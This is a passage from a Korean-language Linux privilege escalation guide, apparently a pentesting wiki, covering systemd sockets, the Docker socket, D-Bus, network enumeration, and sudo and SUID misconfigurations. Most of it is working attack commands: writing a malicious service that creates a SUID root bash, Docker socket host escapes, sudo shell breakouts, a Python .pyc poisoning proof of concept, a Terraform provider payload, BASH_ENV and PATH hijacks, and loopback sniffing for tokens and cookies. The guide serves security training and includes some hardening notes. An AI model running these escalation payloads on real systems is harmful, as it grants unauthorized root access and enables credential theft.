Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS)는 client-server 모델에서 같은 머신 또는 다른 머신 간의 **process communication**을 가능하게 합니다. 이는 컴퓨터 간 통신을 위해 표준 Unix descriptor 파일을 사용하며, `.socket` 파일을 통해 설정됩니다.

Sockets는 `.socket` 파일을 사용해 구성할 수 있습니다.

**`man systemd.socket`로 sockets에 대해 더 알아보세요.** 이 파일 안에서는 몇 가지 흥미로운 파라미터를 설정할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만, 요약하면 socket이 **어디에서 listen할지**를 나타내는 데 사용됩니다(AF_UNIX socket 파일의 경로, listen할 IPv4/6 및/또는 port number 등).
- `Accept`: boolean 인자를 받습니다. **true**이면, 들어오는 각 connection마다 **service instance가 생성**되고 connection socket만 전달됩니다. **false**이면, 모든 listening sockets 자체가 시작된 service unit에 **전달**되며, 모든 connection에 대해 하나의 service unit만 생성됩니다. 이 값은 datagram sockets와 FIFO에는 무시됩니다. 이 경우 단일 service unit이 모든 들어오는 traffic을 무조건 처리합니다. **기본값은 false**입니다. 성능상의 이유로, 새로운 daemon은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상의 command line을 받으며, 각각 listening **sockets**/FIFOs가 **생성**되고 바인드되기 **전** 또는 **후**에 **실행**됩니다. command line의 첫 번째 token은 반드시 절대 경로의 filename이어야 하며, 그 뒤에 process의 arguments가 따라와야 합니다.
- `ExecStopPre`, `ExecStopPost`: listening **sockets**/FIFOs가 **닫히고** 제거되기 **전** 또는 **후**에 **실행**되는 추가 **commands**입니다.
- `Service`: **들어오는 traffic**에 대해 **activate할** **service** unit 이름을 지정합니다. 이 설정은 Accept=no인 sockets에만 허용됩니다. 기본값은 socket와 같은 이름을 가진 service이며(접미사가 바뀜), 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### Writable .socket files

만약 **writable** `.socket` 파일을 찾았다면, `[Socket]` 섹션의 맨 앞에 다음과 같은 것을 **추가**할 수 있습니다: `ExecStartPre=/home/kali/sys/backdoor` 그러면 backdoor는 socket이 생성되기 전에 실행됩니다. 따라서, **아마 machine이 reboot될 때까지 기다려야 할 것입니다.**\
_시스템이 해당 socket file configuration을 사용하고 있어야 하며, 그렇지 않으면 backdoor는 실행되지 않습니다_

### Socket activation + writable unit path (create missing service)

또 다른 영향이 큰 misconfiguration은 다음과 같습니다:

- `Accept=no`이고 `Service=<name>.service`인 socket unit
- 참조된 service unit이 없음
- attacker가 `/etc/systemd/system`(또는 다른 unit search path)에 쓸 수 있음

이 경우 attacker는 `<name>.service`를 만든 뒤 socket으로 traffic을 유도하여 systemd가 새로운 service를 root로 로드하고 실행하게 할 수 있습니다.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

만약 **쓰기 가능한 socket**을 식별했다면 (_여기서는 Unix Sockets를 말하는 것이고, config `.socket` files를 말하는 것이 아님_), 그 socket과 **통신할 수 있으며** 어쩌면 취약점을 exploit할 수도 있습니다.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

다음과 같은 **HTTP 요청을 리슨하는 sockets**가 있을 수 있다는 점에 유의하세요(_여기서는 .socket 파일이 아니라 unix sockets처럼 동작하는 파일을 말합니다_). 다음으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
소켓이 **HTTP** 요청에 응답하면, 이를 **통신**할 수 있고, 어쩌면 **어떤 취약점**을 **악용**할 수도 있습니다.

### Writable Docker Socket

Docker socket은 보통 `/var/run/docker.sock`에 있으며, 반드시 보호해야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 구성원이 쓰기 권한을 가집니다. 이 소켓에 대한 쓰기 권한을 가지면 privilege escalation으로 이어질 수 있습니다. Docker CLI가 없을 때 이를 수행하는 방법과 대체 방법은 다음과 같습니다.

#### **Privilege Escalation with Docker CLI**

Docker socket에 대한 쓰기 권한이 있다면, 다음 명령을 사용해 권한을 상승시킬 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령들은 container를 호스트의 파일 시스템에 root-level access로 실행할 수 있게 해줍니다.

#### **Using Docker API Directly**

Docker CLI를 사용할 수 없는 경우에도, Docker socket은 Docker API와 `curl` commands를 사용해 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 images 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host system의 root directory를 마운트하는 container를 생성하도록 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 container를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`을 사용해 container와 연결을 맺어, 그 안에서 command execution이 가능하게 합니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는, host의 filesystem에 root-level access로 container 안에서 commands를 직접 실행할 수 있습니다.

### Others

docker socket에 대해 write permissions가 있고 **docker** group 안에 있다면 [**privilege escalation**을 할 수 있는 더 많은 방법이 있습니다](interesting-groups-linux-pe/index.html#docker-group). [**docker API가 port에서 listening 중**이라면 그것도 compromise할 수 있습니다](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

다음에서 **container에서 breakout 하거나 container runtimes를 악용해 privilege escalation을 하는 더 많은 방법**을 확인하세요:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

**`ctr`** command를 사용할 수 있다면, 다음 페이지를 읽어보세요. **이를 악용해 privilege escalation을 할 수 있을 수 있습니다**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

**`runc`** command를 사용할 수 있다면, 다음 페이지를 읽어보세요. **이를 악용해 privilege escalation을 할 수 있을 수 있습니다**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 **inter-Process Communication (IPC) system**입니다. modern Linux system을 염두에 두고 설계되었으며, 다양한 형태의 application communication을 위한 견고한 framework를 제공합니다.

이 system은 다재다능하며, 프로세스 간 data exchange를 향상시키는 기본 IPC를 지원하고, **enhanced UNIX domain sockets**를 연상시키는 기능을 제공합니다. 또한 event나 signals를 브로드캐스트하는 데 도움을 주어 system components 간의 seamless integration을 촉진합니다. 예를 들어 Bluetooth daemon이 들어오는 call에 대해 signal을 보내면 music player가 음소거하도록 할 수 있어 user experience를 향상시킵니다. 추가로 D-Bus는 remote object system을 지원하여 application 간 service requests와 method invocations를 단순화하고, 전통적으로 복잡했던 processes를 더 효율적으로 만듭니다.

D-Bus는 **allow/deny model**로 동작하며, 일치하는 policy rules의 누적 효과에 따라 message permissions(method calls, signal emissions, etc.)을 관리합니다. 이러한 policies는 bus와의 상호작용을 지정하며, 이러한 permissions을 악용해 privilege escalation이 가능할 수 있습니다.

`/etc/dbus-1/system.d/wpa_supplicant.conf`의 이러한 policy 예시는 root user가 `fi.w1.wpa_supplicant1`에 대해 소유하고, 전송하고, 메시지를 수신할 수 있는 permissions를 자세히 보여줍니다.

지정된 user나 group이 없는 policies는 전역적으로 적용되며, "default" context policies는 다른 특정 policies가 다루지 않는 모든 항목에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기서 D-Bus 통신을 열거하고 익스플로잇하는 방법을 배워보세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

항상 네트워크를 열거하고 머신의 위치를 파악하는 것은 흥미롭습니다.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

호스트가 명령은 실행할 수 있지만 callback이 실패한다면, DNS, transport, proxy, route filtering을 빠르게 분리하라:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 열려 있는 포트

접근하기 전에 이전에는 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
리스너를 bind target별로 분류:

- `0.0.0.0` / `[::]`: 모든 local interface에 노출됨.
- `127.0.0.1` / `::1`: local-only (tunnel/forward 후보로 적합).
- 특정 internal IPs (예: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 보통 internal segment에서만 접근 가능함.

### local-only service triage workflow

호스트를 compromise하면, `127.0.0.1`에 bound된 서비스는 shell에서 처음으로 reachable해지는 경우가 많습니다. 빠른 local workflow는:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS를 network scanner로 사용하기 (network-only mode)

local PE checks 외에도, linPEAS는 focused network scanner로 실행될 수 있습니다. 이는 `$PATH`에서 사용 가능한 binaries(일반적으로 `fping`, `ping`, `nc`, `ncat`)를 사용하며, tooling을 설치하지 않습니다.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` 없이 `-d`, `-p`, 또는 `-i`를 전달하면, linPEAS는 순수 네트워크 스캐너처럼 동작합니다(나머지 privilege-escalation 검사들을 건너뜁니다).

### Sniffing

트래픽을 sniff 할 수 있는지 확인하세요. 가능하다면 일부 credentials를 가져올 수 있을지도 모릅니다.
```
timeout 1 tcpdump
```
빠른 실용적인 점검:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`)는 post-exploitation에서 특히 가치가 있습니다. 왜냐하면 많은 내부 전용 서비스가 그곳에 token/cookies/credentials를 노출하기 때문입니다:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
나중에 파싱하고, 지금 캡처하기:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

**누구**인지 확인하고, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 어떤 사용자들이 **login**할 수 있는지, 그리고 어떤 사용자들이 **root privileges**를 가지고 있는지 확인합니다:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있게 하는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 및 [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 권한을 부여할 수 있는 **어떤 group의 member인지** 확인하세요:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

클립보드 안에 흥미로운 내용이 있는지 확인하세요(가능한 경우)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

환경의 **어떤 비밀번호든 알고 있다면** 각 사용자로 **로그인해 보세요**.

### Su Brute

큰 소음을 내는 것에 신경 쓰지 않고 `su`와 `timeout` 바이너리가 컴퓨터에 있다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 사용자에 대해 brute-force를 시도할 수 있습니다.\
`-a` 파라미터가 있는 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 사용자에 대해 brute-force를 시도합니다.

## Writable PATH abuses

### $PATH

`$PATH`의 어떤 폴더 안에 **쓸 수 있다면**, 다른 사용자(이상적으로는 root)가 실행할 어떤 명령의 이름으로 **쓰기가 가능한 폴더 안에 backdoor를 만들어 privilege escalation**을 할 수 있을지도 모릅니다. 단, 그 명령이 `$PATH`에서 **당신의 writable folder보다 앞에 있는** 폴더에서 로드되지 않아야 합니다.

### SUDO and SUID

sudo를 사용해 어떤 명령을 실행하도록 허용되었거나 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용해 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
어떤 **예상치 못한 명령은 파일을 읽고/쓰거나 심지어 명령을 실행할 수 있게 합니다.** 예를 들면:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 설정은 사용자가 비밀번호를 모른 채 다른 사용자의 권한으로 특정 명령을 실행하도록 허용할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예시에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있으므로, 이제 root 디렉터리에 ssh key를 추가하거나 `sh`를 호출해 shell을 얻는 것이 매우 쉽다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문을 사용하면 사용자가 어떤 것을 실행하는 동안 **환경 변수를 설정**할 수 있습니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예시는 **HTB machine Admirer**를 기반으로 하며, 스크립트를 root로 실행하는 동안 임의의 python library를 불러오기 위해 **PYTHONPATH hijacking**에 **취약**했습니다:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

If a **sudo-allowed Python script** imports a module whose package directory contains a **writable `__pycache__`**, you may be able to replace the cached `.pyc` and get code execution as the privileged user on the next import.

- Why it works:
- CPython은 bytecode cache를 `__pycache__/module.cpython-<ver>.pyc`에 저장합니다.
- interpreter는 **header**(source에 연결된 magic + timestamp/hash metadata)를 검증한 뒤, 그 header 뒤에 저장된 marshaled code object를 실행합니다.
- directory가 writable이라면 cached file을 **delete and recreate**할 수 있어서, root-owned이지만 non-writable인 `.pyc`도 교체할 수 있습니다.
- Typical path:
- `sudo -l`가 root로 실행할 수 있는 Python script 또는 wrapper를 보여줍니다.
- 그 script가 `/opt/app/`, `/usr/local/lib/...`, etc.의 local module을 import합니다.
- imported module의 `__pycache__` directory가 your user 또는 everyone에게 writable입니다.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
권한 있는 스크립트를 검사할 수 있다면, 가져온 모듈과 해당 캐시 경로를 식별하라:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. sudo-allowed script를 한 번 실행해서 Python이 legit cache file을 아직 없으면 생성하게 한다.
2. legit `.pyc`의 처음 16 bytes를 읽고 poisoned file에 재사용한다.
3. payload code object를 compile하고, `marshal.dumps(...)`한 뒤, original cache file을 삭제하고 original header에 malicious bytecode를 붙여 다시 만든다.
4. sudo-allowed script를 다시 실행해서 import가 payload를 root로 실행하게 한다.

Important notes:

- original header를 재사용하는 것이 핵심이다. Python은 bytecode body가 실제로 source와 일치하는지 확인하지 않고, source file과 cache metadata를 비교하기 때문이다.
- 이는 source file이 root-owned이고 writable하지 않지만, 포함하는 `__pycache__` directory는 writable할 때 특히 유용하다.
- privileged process가 `PYTHONDONTWRITEBYTECODE=1`를 사용하거나, safe permissions가 있는 location에서 import하거나, import path의 모든 directory에 대한 write access를 제거하면 공격은 실패한다.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- 권한이 높은 Python import path의 어떤 디렉터리도 저권한 사용자가 쓸 수 없도록 하세요. `__pycache__`도 포함됩니다.
- 권한 높은 실행에서는 `PYTHONDONTWRITEBYTECODE=1` 사용과, 예상치 못한 writable `__pycache__` 디렉터리에 대한 주기적 점검을 고려하세요.
- writable local Python modules와 writable cache directories는 root가 실행하는 writable shell scripts나 shared libraries와 동일하게 취급하세요.

### BASH_ENV preserved via sudo env_keep → root shell

sudoers가 `BASH_ENV`를 보존하면(예: `Defaults env_keep+="ENV BASH_ENV"`), 허용된 명령을 실행할 때 Bash의 non-interactive startup behavior를 이용해 root로 arbitrary code를 실행할 수 있습니다.

- 작동 이유: non-interactive shells에서는 Bash가 대상 script를 실행하기 전에 `$BASH_ENV`를 평가하고 그 파일을 source합니다. 많은 sudo 규칙은 script나 shell wrapper 실행을 허용합니다. `BASH_ENV`가 sudo에 의해 보존되면, 해당 파일은 root privileges로 source됩니다.

- 요구사항:
- 실행 가능한 sudo rule 1개( `/bin/bash`를 non-interactive로 호출하는 대상, 또는 bash script를 호출하는 대상).
- `env_keep`에 `BASH_ENV`가 포함되어 있어야 함(`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep`에서 `BASH_ENV`(및 `ENV`)를 제거하고, `env_reset`을 사용하는 것을 권장한다.
- sudo로 허용된 명령에 shell wrapper를 사용하지 말고, 최소한의 binary를 사용하라.
- 보존된 env vars가 사용될 때 sudo I/O logging과 alerting을 고려하라.

### `!env_reset`가 적용된 상태에서 preserved HOME를 사용하는 Terraform via sudo

sudo가 환경을 그대로 유지(`!env_reset`)한 채 `terraform apply`를 허용하면, `$HOME`은 호출한 사용자로 유지된다. 따라서 Terraform은 root로 **$HOME/.terraformrc**를 로드하고 `provider_installation.dev_overrides`를 적용한다.

- 필요한 provider를 writable directory로 가리키고, provider 이름을 딴 악성 plugin을 배치하라(예: `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform는 Go plugin handshake에 실패하지만, 종료되기 전에 payload를 root로 실행하고, 결과적으로 SUID shell을 남긴다.

### TF_VAR overrides + symlink validation bypass

Terraform variables는 `TF_VAR_<name>` 환경 변수로 제공될 수 있으며, sudo가 environment를 보존할 때 이 변수들은 유지된다. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 같은 약한 validation은 symlink로 우회할 수 있다:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform은 symlink를 해석하고 실제 `/root/root.txt`를 공격자가 읽을 수 있는 대상 경로로 복사합니다. 같은 방법은 대상 symlink를 미리 생성해서 privileged path에 **write**하는 데도 사용할 수 있습니다(예: provider의 destination path를 `/etc/cron.d/` 내부를 가리키게 함).

### requiretty / !requiretty

일부 오래된 배포판에서는 sudo가 `requiretty`로 설정될 수 있으며, 이 경우 sudo는 대화형 TTY에서만 실행됩니다. `!requiretty`가 설정되어 있거나 해당 옵션이 없으면, sudo는 reverse shells, cron jobs, scripts 같은 비대화형 컨텍스트에서도 실행될 수 있습니다.
```bash
Defaults !requiretty
```
이것은 그 자체로 직접적인 취약점은 아니지만, full PTY 없이도 sudo rule을 악용할 수 있는 상황을 확장합니다.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l`이 `env_keep+=PATH` 또는 attacker-writable 항목(예: `/home/<user>/bin`)을 포함하는 `secure_path`를 보여주면, sudo로 허용된 target 내부의 모든 상대 command는 shadowed 될 수 있습니다.

- Requirements: absolute paths를 사용하지 않고 command를 호출하는 script/binary를 실행하는 sudo rule(대개 `NOPASSWD`)과, 먼저 검색되는 writable PATH entry가 필요합니다.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 실행 우회 경로
다른 파일을 읽거나 **symlink**를 사용하려면 **Jump**. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용되면(\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 명령 경로가 없는 Sudo command/SUID binary

단일 command에 대해 **sudo permission**이 **경로를 지정하지 않고** 부여된 경우: _hacker10 ALL= (root) less_ PATH 변수를 변경해서 이를 exploit할 수 있습니다
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행하는 경우에도 사용할 수 있다**(**이상한 SUID 바이너리의 내용을** _**strings**_ **로 항상 확인하라**).

[실행할 페이로드 예시.](payloads-to-execute.md)

### 명령 경로가 있는 SUID binary

**suid** 바이너리가 **경로를 지정해 다른 명령을 실행**한다면, suid 파일이 호출하는 명령과 같은 이름의 **function**을 **export**해 볼 수 있다.

예를 들어, suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 **function**을 만들고 export해 보아야 한다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### SUID wrapper에 의해 실행되는 writable script

흔한 custom-app misconfiguration은 root-owned SUID binary wrapper가 script를 실행하는데, 그 script 자체는 low-priv users가 writable인 경우입니다.

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh`가 writable하다면, payload 명령을 추가한 뒤 SUID wrapper를 실행할 수 있습니다:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
간단한 확인 사항:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
이 공격 경로는 특히 `/usr/local/bin`에 배포된 "maintenance"/"backup" wrapper에서 흔합니다.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 로더가 표준 C library (`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 불러올 하나 이상의 shared library (.so 파일)를 지정하는 데 사용됩니다. 이 과정은 library를 preloading하는 것으로 알려져 있습니다.

하지만 시스템 보안을 유지하고, 특히 **suid/sgid** executable에서 이 기능이 악용되는 것을 막기 위해 시스템은 특정 조건을 강제합니다:

- 로더는 실제 사용자 ID (_ruid_)가 effective user ID (_euid_)와 일치하지 않는 executable에 대해서는 **LD_PRELOAD**를 무시합니다.
- suid/sgid가 설정된 executable의 경우, standard paths에 있고 동시에 suid/sgid인 library만 preloading됩니다.

